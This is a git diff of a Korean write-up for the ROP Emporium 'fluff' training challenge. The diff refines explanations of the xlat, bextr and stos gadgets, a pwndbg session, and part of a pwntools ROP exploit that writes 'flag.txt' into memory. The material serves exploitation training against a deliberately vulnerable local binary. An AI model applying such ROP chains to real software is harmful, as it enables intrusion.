@@ -1,4 +1,4 @@
-# [fluff(작성 중)](https://ropemporium.com/challenge/fluff.html)
+# [fluff](https://ropemporium.com/challenge/fluff.html)
 <br />
 
 **Description:**
@@ -68,17 +68,22 @@ Disassembly of section .text:
 <br />
 
 > [!NOTE]
-> `xlat`
-> 
-> - `xlat`는 `[rbx + al] = al`을 수행합니다. 즉, `rbx`로부터 `al`만큼 떨어진 주소의 1바이트를 `al`에 저장합니다.
-> 
-> `bextr dest, src, ctrl`
+> [xlat](https://www.felixcloutier.com/x86/xlat:xlatb) 는 `[rbx + al] = al`을 수행합니다. 즉, `rbx`로부터 `al`만큼 떨어진 주소의 1바이트를 `al`에 저장합니다.
 >
-> - `bextr`은 `(src >> Start) & ((1 << Length) - 1) = dest`를 수행합니다. 
-> 
-> `stos`
->
-> - `stos`는 
+> [bextr](https://www.felixcloutier.com/x86/bextr) 의 형식은 `BEXTR dest, src, ctrl`이고, `dest = (src >> Start) & ((1 << Length) - 1)`를 수행합니다. `ctrl[7:0]`은 `start`, `ctrl[15:8]`은 `length`를 의미합니다. 따라서 `bextr`은 `src`를 `start`에서부터 `length`만큼 비트를 자르고 제로확장을 하여 `dest`에 저장합니다.
+> ```yaml
+> > bextr rbx, rcx, rdx
+> rcx = 0xDEADBEEFDEADBEEF, rdx = 0x0804(start=4, len=8)
+> Input : 1101111010101101101111101110111111011110101011011011111011101111 = 0xDEADBEEFDEADBEEF
+>                                                             |------|
+>                                                                 \
+>                                                                  \
+>                                                                   \
+>                                                                    v
+>                                                                 |------|
+> Output: 0000000000000000000000000000000000000000000000000000000011101110 = 0x00000000000000EE
+> ```
+> [stos](https://www.felixcloutier.com/x86/stos:stosb:stosw:stosd:stosq) 는 레지스터의 값을 메모리에 저장하고 , `rdi`를 자동으로 증가시키는 역할을 수행합니다. `stos` 종류에 따라 저장 단위와 증가량이 달라집니다.
 
 
 <br />
@@ -121,6 +126,8 @@ nth paddr      vaddr      bind   type   size lib name                           
 
 위 가젯들로 문자열 `"f"`를 추출하겠습니다.
 
+<br />
+
 ```yaml
 $ gdb fluff -q
 ...
@@ -131,44 +138,23 @@ pwndbg> x/s 0x004003c4
 0x4003c4:       "fluff.so"
 pwndbg> x/a 0x004003c4
 0x4003c4:       0x6f732e6666756c66
-pwndbg> set $rcx=0x6f732e6666756c66
-pwndbg> set $rdx=0x800
+pwndbg> i r $al
+al             0xb                 11
+pwndbg> set $rcx=0x4003c4 - 11
+pwndbg> set $rdx=0x2000
 pwndbg> set $rip=0x400633
 pwndbg> si
-
 ...
-pwndbg> i r $rbx
-rbx            0x66                102
+pwndbg> set $rip=0x400628
+pwndbg> si
+...
+pwndbg> i r $al
+al             0x66                102
 ```
-필요한 레지스터를 세팅하고 `bextr`을 호출하면 `rbx`에 `rcx`의 1바이트가 저장된 것을 알 수 있습니다. 이 방법으로 `"flag.txt"`를 만들 수 있습니다.
+필요한 레지스터를 세팅하고 `bextr`, `xlat`를 순서대로 호출하면 `al`에 `[rcx]`의 1바이트가 저장된 것을 알 수 있습니다. 이 방법으로 `"flag.txt"`를 만들 수 있습니다.
 
-<br />
-
-> [!CAUTION]
-> ```bash
-> $ gdb fluff -q
-> ...
-> pwndbg> b *main+9
-> Breakpoint 1 at 0x400610
-> pwndbg> r
-> Starting program: /home/kali/pico/fluff
-> [Thread debugging using libthread_db enabled]
-> Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-> fluff by ROP Emporium
-> x86_64
-> 
-> You know changing these strings means I have to rewrite my solutions...
-> >
-> Thank you!
-> 
-> Breakpoint 1, 0x0000000000400610 in main ()
-> ...
-> pwndbg> i r $al
-> al             0xb                 11
-> ```
-> `xlat`는 `[rbx + al]`에 위치한 1바이트를 `al`에 저장합니다. 위 디버깅으로 `al`의 초기 값이 11임을 알 수 있습니다. 이 부분을 고려하지 않고 공격 코드를 작성하면 원하는 문자열이 만들어지지 않으므로 주의해야 합니다.
-
-위에서 찾은 정보를 가지고 공격 코드를 작성할 수 있습니다.
+> [!Caution]
+> `xlat`은 `[rbx + al]`에 위치한 1바이트를 `al`에 저장합니다. 위 디버깅 중 레지스터를 세팅하기 전 `al`의 초기 값은 `11`임을 알 수 있습니다. 이 부분을 고려하지 않고 공격 코드를 작성하면 원하는 문자열이 만들어지지 않으므로 주의해야 합니다.
 
 <br />
 <br />
@@ -182,11 +168,11 @@ context.bits = 64
 p = process('./fluff')
 
 def write_byte():
-    pay = b''
     al = 11  # initial al = 11
-    for i, c in enumerate(target):
+    pay = flat(pop_rdi, bss)
+    for c in target:
         rcx = flag_addr[c]-al-0x3ef2
-        pay += flat(bextr, 0x2000, rcx, xlat, pop_rdi, bss+i, stos)
+        pay += flat(bextr, 0x2000, rcx, xlat, stos)
 
         al = ord(c)
     return pay
